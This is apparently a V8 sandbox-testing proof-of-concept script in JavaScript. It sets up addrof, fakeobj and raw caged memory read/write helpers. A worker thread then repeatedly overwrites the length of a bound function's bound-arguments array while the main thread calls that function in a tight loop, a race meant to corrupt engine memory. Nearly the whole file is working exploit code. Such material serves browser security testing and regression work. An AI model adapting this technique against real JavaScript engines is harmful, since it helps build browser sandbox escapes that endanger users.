// Flags: --sandbox-testing

const kHeapObjectTag = 1;
const kWeakHeapObjectTag = 3;

const kJSBoundFunctionBoundArgumentsOffset = 0x14;
const kFixedArrayLengthOffset = 0x4;

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj, tagged = false) {
  let ofs = Sandbox.getAddressOf(obj);
  return tagged ? (ofs | kHeapObjectTag) : (ofs & ~kWeakHeapObjectTag);
}
function fakeobj(ofs) {
  return Sandbox.getObjectAt(ofs);
}
for (let bits = 8; bits <= 64; bits *= 2) {
  const read_fn = memory[`get${bits == 64 ? 'Big' : ''}Uint${bits}`].bind(memory);
  globalThis[`caged_read${bits}`] = function (ofs, maybe_ofs) {
    if (maybe_ofs !== undefined) {
      return read_fn((ofs & ~kWeakHeapObjectTag) + maybe_ofs, true);
    } else {
      return read_fn(ofs, true);
    }
  }
  const write_fn = memory[`set${bits == 64 ? 'Big' : ''}Uint${bits}`].bind(memory);
  globalThis[`caged_write${bits}`] = function (ofs, val_or_ofs, maybe_val) {
    if (maybe_val !== undefined) {
      return write_fn((ofs & ~kWeakHeapObjectTag) + val_or_ofs, maybe_val, true);
    } else {
      return write_fn(ofs, val_or_ofs, true);
    }
  }
}
globalThis.caged_read = globalThis.caged_read32;
globalThis.caged_write = globalThis.caged_write32;

function gc_minor() { // scavenge
  for (let i = 0; i < 1000; i++) {
    new ArrayBuffer(0x10000);
  }
}
function gc_major() { // mark-sweep
  try {
    new ArrayBuffer(0x7fe00000);
  } catch {
  }
}

const A = class A {
  constructor() {
  }
};
const B = A.bind(null, 1);
function foo() { return new B(); }

for (let i = 0; i < 0x100000; i++) {
  new A();
}

const pbfn = addrof(B);
const pbarg = caged_read(pbfn, kJSBoundFunctionBoundArgumentsOffset);
const pbarg_len = (pbarg & ~kWeakHeapObjectTag) + kFixedArrayLengthOffset;

let workerScript = `
  const kHeapObjectTag = 1;
  let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  function caged_write(ptr, value) {
    memory.setUint32(ptr, value, true);
  }
  let pbarg_len = ${pbarg_len};
  while (true) {
    caged_write(pbarg_len, 0);
    caged_write(pbarg_len, 2);  // smi 1
  }
`;
let worker = new Worker(workerScript, {type: 'string'});
for (let i = 0; i < 0x1000000; i++);
for (let i = 0; i < 0x1000000; i++) {
  foo();
}
